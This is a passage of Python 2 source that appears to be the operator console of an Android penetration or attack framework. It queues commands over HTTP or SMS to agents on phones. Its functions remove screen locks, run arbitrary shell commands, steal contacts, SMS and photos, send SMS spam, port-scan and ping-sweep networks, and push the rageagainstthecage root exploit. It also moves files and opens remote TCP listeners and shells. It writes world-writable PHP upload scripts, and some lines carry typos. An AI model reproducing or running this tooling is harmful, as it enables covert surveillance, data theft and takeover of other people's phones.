            print "\n\tRemove screenlocks (password, PIN, etc). No permissions required. Fixed in Android 4.4.  Fill in the command and the delivery method(SMS or HTTP).\n"
            commandtoexecute = "am start --user 0 -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task"
            deliverymethod  = raw_input('Delivery Method(SMS or HTTP): ').strip().lower()
            downloaded = "no"
            if deliverymethod == "http":
              command = key + " " + "EXEC" + " " + "none" + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
              control = webserver + path + "/putfunc"
              f = open(control, 'a')
              f.write(command)
              f.close()
              break

            if deliverymethod == "sms":
              modem = get_modem()
              if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
              else:
                command = key + " " + "EXEC" + " " + str(modem)  + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break   	
def pmlist(number,path,key, id):
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
	print "\n\tGets a list of installed packages(apps) and uploads to a file.\n"
        commandtoexecute = "pm list packages"
        downloaded = "no"
        deliverymethod  = raw_input('Delivery Method(SMS or HTTP): ').strip().lower()

        if deliverymethod == "http":
            command = key + " " + "EXUP" + " " + "none" + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'a')
            f.write(command)
            f.close()
            break

        if deliverymethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "EXUP" + " " + str(modem)  + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break    
def execup(number, path, key, id): 
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
	print "\n\tRun a command in the terminal and upload the output. Fill in the command and the delivery method(SMS or HTTP).\n"
        commandtoexecute = raw_input('Command: ').strip()
        downloaded = raw_input('Downloaded?: ').strip()
        deliverymethod  = raw_input('Delivery Method(SMS or HTTP): ').strip().lower()

        if deliverymethod == "http":
            command = key + " " + "EXUP" + " " + "none" + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'a')
            f.write(command)
            f.close()
            break

        if deliverymethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "EXUP" + " " + str(modem)  + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break        


def runnmap(number, path, key, id):
    webserver = config.get("WEBSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
    	print "\n\tDownload Nmap and port scan a host of range. Use any accepted format for target specification in Nmap"
    	targets = raw_input('Nmap Target: ').strip()
    	deliverymethod = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
    	nmaplocation = config.get("ANDROIDNMAPLOC")
    	copynmap1 = "cp " + nmaplocation + "/bin/nmap " + webserver + path + "/nmap"
    	os.system(copynmap1)
    	copynmap2 = "cp " + nmaplocation + "/share/nmap/nmap-services " + webserver + path + "/nmap-services"
    	os.system(copynmap2) 
    	if deliverymethod == "http":
		command = key + " " + "NMAP" + " " + "none" + " " + deliverymethod + " " + targets + "\n"
   		control = webserver + path + "/putfunc"
        	f = open(control, 'w')
        	f.write(command)
        	f.close()
        	break
    	if delivermethod == "sms":
		 modem = get_modem()
            	 if str(modem) == '0':
                	print "\nNo modems found. Attach a modem to use this functionality"
            	 else:
                	command = key + " " + "NMAP" + " " + str(modem)  + " " + deliverymethod + " " + targets + "\n"
                	control = webserver + path + "/putfunc"
                	f = open(control, 'w')
                	f.write(command)
                	f.close()
               	 	break

def spam(number, path, key, id):
    webserver = config.get("WEBSERVER")    
    ipaddress = config.get("IPADDRESS") 
    while True:
        print "\n\tSend an SMS message to another phone. Fill in the number, the message to send, and the delivery method(SMS or HTTP).\n"
        sendnumber = raw_input('Number: ').strip()
        sendmessage = raw_input('Message: ').strip()
        deliverymethod = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        if deliverymethod == "http":
            command = key + " " + "SPAM" + " " + "none" + " " + deliverymethod + " " + sendnumber + " " + sendmessage + "\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'w')
            f.write(command)
            f.close()
            break

        if deliverymethod == "sms":
            modem = get_modem()
            if str(modem) == '0':
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "SPAM" + " " + str(modem)  + " " + deliverymethod + " " + sendnumber + " " + sendmessage + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

def getcontacts(number, path, key, id):
    webserver = config.get("WEBSERVER")
    
    ipaddress = config.get("IPADDRESS")
     
    while True:
        print "\n\tGet contacts from phone with agent. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP)."

        deliverymethod = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        returnmethod = raw_input('Return Method(SMS or HTTP) ').strip().lower()

        if returnmethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                if deliverymethod == "http":
                    command = key + " CONT " + deliverymethod + " " + returnmethod +  " " + str(modem) + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break

                if deliverymethod == "sms":
                    modem = get_modem()
                    if int(modem) == 0:
                            print "\nNo modems found. Attach a modem to use this functionality"
                    else:

                        command = key + " CONT " + deliverymethod + " " + returnmethod + " " + str(modem) + "\n"
                        control = webserver + path + "/putfunc"
                        f = open(control, 'w')
                        f.write(command)
                        f.close()
                        break

        if returnmethod == "http":            
            if deliverymethod == "http":
                command = key + " CONT " + deliverymethod + " " + returnmethod +  "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

            if deliverymethod == "sms":
                modem = get_modem()
                if int(modem) == 0:
                        print "\nNo modems found. Attach a modem to use this functionality"
                else:
                    command = key + " CONT " + deliverymethod + " " + returnmethod + " " + str(modem) + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break

def picture(number, path, key, id):
    webserver = config.get("WEBSERVER")    
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tTake a picture and upload it to the webserver. Will upload a message if it fails."
        delivery = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        if delivery == "http":
            command = key + " PICT http\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'w')
            f.write(command)
            f.close()
            break

        if delivery == "sms":
            modem = get_modem()
            if int(modem) == 0:
                    print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " PICT sms " + str(modem) + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

def getsms(number, path, key, id):
    webserver = config.get("WEBSERVER")
    
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tGet break 10 sms from phone with agent. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP).\n"
        deliverymethod = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        returnmethod = raw_input('Return Method(SMS or HTTP) ').strip().lower()

        if returnmethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "SMSS" + " " + deliverymethod + " " + returnmethod + " " +  str(modem) + "\n"; 
                if deliverymethod == "http":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break


                if deliverymethod == "sms":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break

        if returnmethod == "http":
            if deliverymethod == "http":
                command = key + " SMSS " + deliverymethod + " " + returnmethod + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

            if deliverymethod == "sms":
                modem = get_modem()
                if int(modem) == 0:
                        print "\nNo modems found. Attach a modem to use this functionality"
                else:
                    command = key + " SMSS " + deliverymethod + " " + returnmethod + " " + str(modem) + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'w')
                    f.write(command)
                    f.close()
                    break

def root(number, path, key, id, choose):
    webserver = config.get("WEBSERVER")
    
    ipaddress = config.get("IPADDRESS")
    db = DB(config=config)
    db.query("SELECT platform from agents where id=%s", (id,))
    plat = db.fetchone()[0]
    sploitdir = config.get("EXPLOITSLOC")
    if plat == "Android":
      tempdir = sploitdir + "/Android/binaries/"    
      while True:    
        print "\n\tTry a privilege escalation exploit.\n"
        if choose == "choose":
            db.query("SELECT osversion from agents where id=%s", (id,))
    	    version = db.fetchone()[0]
	    print version
	    if (int(version) <= 8):
	    
		print "Chosen Exploit: rageagainstthecage"
		choose = "rageagainstthecage"
            else:
		print "No exploit for the platform found."
		break
	binary = tempdir + choose
	copybinary = "cp " + binary + " " +  webserver + path + "/" + choose
        os.system(copybinary)
        delivery = raw_input('Delivery Method (SMS or HTTP): ').strip().lower()
        command = key + " ROOT " + delivery + " "  + choose + "\n"
        if delivery == "http":
            control = webserver + path + "/putfunc"
            f = open(control, 'w')
            f.write(command)
            f.close()
            break

        if delivery == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

def down(number, path, key, id):
    webserver = config.get("WEBSERVER")
    
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tDownloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP)."
        filetocopy = raw_input('File to download: ').strip()
        wheretoputit = raw_input('Hosting Path: ').strip()
        filename = raw_input('Filename: ').strip()
        deliverymethod = raw_input('Delivery Method(SMS or HTTP): ').strip().lower()

        fullpath = webserver + wheretoputit
        command1 = "mkdir " + fullpath
        os.system(command1)
        command = "cp " + filetocopy + " " + webserver + wheretoputit + filename
        os.system(command)

        if deliverymethod == "http":
            command = key + " " + "DOWN" + " " + "none" + " " + deliverymethod + " " + wheretoputit + " " + filename + "\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'w')
            f.write(command)
            f.close()
            break

        if deliverymethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "DOWN" + " " + str(modem)  + " " + deliverymethod + " " + wheretoputit + " " + filename + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break

def run(number, path, key, id):
    webserver = config.get("WEBSERVER")
    
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tRun a command in the terminal. Fill in the command and the delivery method(SMS or HTTP).\n"
        commandtoexecute = raw_input('Command: ').strip()
        downloaded = raw_input('Downloaded?: ').strip()
        deliverymethod  = raw_input('Delivery Method(SMS or HTTP): ').strip().lower()

        if deliverymethod == "http":
            command = key + " " + "EXEC" + " " + "none" + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
            control = webserver + path + "/putfunc"
            f = open(control, 'a')
            f.write(command)
            f.close()
            break

        if deliverymethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "EXEC" + " " + str(modem)  + " " + deliverymethod + " " + downloaded + " " + commandtoexecute + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break        

def ping(number, path, key, id):
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tPing sweep the local network. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP).\n"

        deliverymethod  = raw_input('Delivery Method(SMS or HTTP) ').strip().lower()
        returnmethod  = raw_input('Return Method(SMS or HTTP): ').strip().lower()

        if returnmethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "PING" + " " + deliverymethod + " " + returnmethod + " " +  str(modem) + "\n"; 
                if deliverymethod == "http":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break

                if deliverymethod == "sms":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break

        if returnmethod == "http":
            if deliverymethod == "http":
                command = key + " PING " + deliverymethod + " " + returnmethod + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break

            if deliverymethod == "sms":
                modem = get_modem()
                if int(modem) == 0:
                        print "\nNo modems found. Attach a modem to use this functionality"
                else:
                    command = key + " PING " + deliverymethod + " " + returnmethod + " " + str(modem) + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break

def upload(number, path, key, id):
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:    
        print "\n\tUpload a file\n"
        delivery  = raw_input('Delivery Method (SMS or HTTP) ').strip().lower()
        filename = raw_input('Filename: ').strip()
        if delivery == "http":
            command = key + " UPLD http " + filename + " \n"
            control = webserver + path + "/putfunc"
            f = open(control, 'w')
            f.write(command)
            f.close() 
            break

        if delivery == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " UPLD sms " + filename + " " + str(modem) + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'w')
                f.write(command)
                f.close()
                break    

def listener(number, path, key, id):
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tOpen a TCP listener on the phone. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP) as well as the port to listen on."
        print "\nDelivery Method(SMS or HTTP)"
        print 
        deliverymethod = raw_input('spf> ').strip().lower()
        print "\nReturn Method(SMS or HTTP)"
        print
        returnmethod = raw_input('spf> ').strip().lower()
        print "\nPort:"
        print
        port1 = raw_input('spf> ').strip()
        fullpath = webserver + path
        com = fullpath + "/" + port1 + ".txt"
        commd = "touch " + com
        os.system(commd)
        command7 = "chmod 777 " + com
        os.system(command7)
        com = fullpath + "/" + port1 + "control"
        commd = "touch " + com
        os.system(commd)
        command7 = "chmod 777 " + com
        os.system(command7)
        textupload = fullpath + "/" + port1 + "uploader.php"
        command10 = "touch " + textupload
        os.system(command10)
        command11 = "chmod 777 " + textupload
        os.system(command11)
        textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('" + port1 + ".txt', 'ab');\nfwrite($file, $base);\n?>"
        f = open(textupload, 'w')
        f.write(textuploadtext)
        f.close()

        connectupload = fullpath + "/" + port1 + "controluploader.php"
        command12 = "touch " + connectupload
        os.system(command12)
        command13 = "chmod 777 " + connectupload
        os.system(command13)
        connectuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('" + port1 + "control','wb');\nfwrite($file, $base);\n?>";
        f = open(connectupload, 'w')
        f.write(connectuploadtext)
        f.close()

        if returnmethod == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = key + " " + "LIST" + " " + deliverymethod + " " + returnmethod + " " +  str(modem) + " " + port1 + "\n"; 
                if deliverymethod == "http":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break
                if deliverymethod == "sms":
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break

        if returnmethod == "http":
            if deliverymethod == "http":
                command = key + " LIST " + deliverymethod + " " + returnmethod + " none " + port1 + "\n"
                control = webserver + path + "/putfunc"
                f = open(control, 'a')
                f.write(command)
                f.close()
                break

            if deliverymethod == "sms":
                modem = get_modem()
                if int(modem) == 0:
                    print "\nNo modems found. Attach a modem to use this functionality"
                else:
                    command = key + " LIST " + deliverymethod + " " + returnmethod + " " + str(modem) + " " + port1 + "\n"
                    control = webserver + path + "/putfunc"
                    f = open(control, 'a')
                    f.write(command)
                    f.close()
                    break

def connectlisten(number, path, key, id):
    webserver = config.get("WEBSERVER")
    sqlserver = config.get("MYSQLSERVER")
    ipaddress = config.get("IPADDRESS")
    while True:
        print "\n\tConnect to a TCP Listener from the agent.Enter the port number of the listener."
        port1 = raw_input('\nPort: ').strip()
        communication = raw_input("\nCommunication Method(HTTP or SMS): ").strip()
        if communication.lower() == "sms":
            modem = get_modem()
            if int(modem) == 0:
                print "\nNo modems found. Attach a modem to use this functionality"
            else:
                command = "perl shellpoll.pl " + path + " " + port1 + " " + communication + " " + str(modem) + " " + key + " " + number
                os.system(command)
                break
        elif communication.lower() == "http":
            command = "perl shellpoll.pl " + path + " " + port1 + " " + communication + " " + "none" + " " + key + " " + number
            os.system(command)
            break

if __name__ == '__main__':
    main()
